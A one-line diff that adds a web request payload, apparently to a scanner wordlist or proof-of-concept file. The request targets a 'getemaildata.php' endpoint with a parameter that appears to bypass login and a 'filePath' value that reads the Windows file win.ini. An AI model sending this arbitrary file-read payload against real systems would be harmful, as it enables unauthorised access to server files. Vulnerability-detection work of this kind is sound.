@@ -1,0 +1,1 @@
+/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
